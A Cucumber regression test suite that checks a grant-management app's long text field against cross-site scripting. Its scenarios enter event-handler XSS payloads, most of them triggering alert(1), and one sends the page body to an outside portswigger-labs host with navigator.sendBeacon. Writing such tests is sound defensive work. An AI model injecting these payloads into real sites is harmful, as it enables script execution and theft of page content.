@US-296453 @regression-QA @Sprint-5-Year-2023
Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
  Text Field of Data Table Enhanced, few script has to handle.
  Need to handle same scenario in PDF for CKEditor, Data Table and Data Table Enhanced. (Suite ID: 304363)

  @300082 @Vrushali
  Scenario Outline: XSS- Data table-(Admin) To verify when user enters script in the long text area field then alert should not display.
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    And I enter value "Test_Description" into field "fieldBeneficiaryEligibility__c"
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303055 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                 | Field                          |
      | <xss onafterscriptexecute=alert(1)><script>1</script> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      #| PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303057 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                           | Field                          |
      | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      #| PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303069 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                      | Field                          |
      | <style>keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303071 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                           | Field                          |
      | <style>keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303074 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                        | Field                          |
      | <style>keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303077 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                               | Field                          |
      | <body onbeforeprint=console.log(1)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303083 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                  | Field                          |
      | <xss onbeforescriptexecute=alert(1)><script>1</script> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303085 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                     | Field                          |
      | <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303086 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                  | Field                          |
      | <svg><animate onbegin=alert(1) attributeName=x dur=1s> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303089 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                          |
      | <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303090 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                            | Field                          |
      | <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303091 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                   | Field                          |
      | <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303093 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value             | Field                          |
      | {testData:script} | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303096 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                         | Field                          |
      | <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303098 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                | Field                          |
      | <svg><animate onend=alert(1) attributeName=x dur=1s> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303099 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                            | Field                          |
      | <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
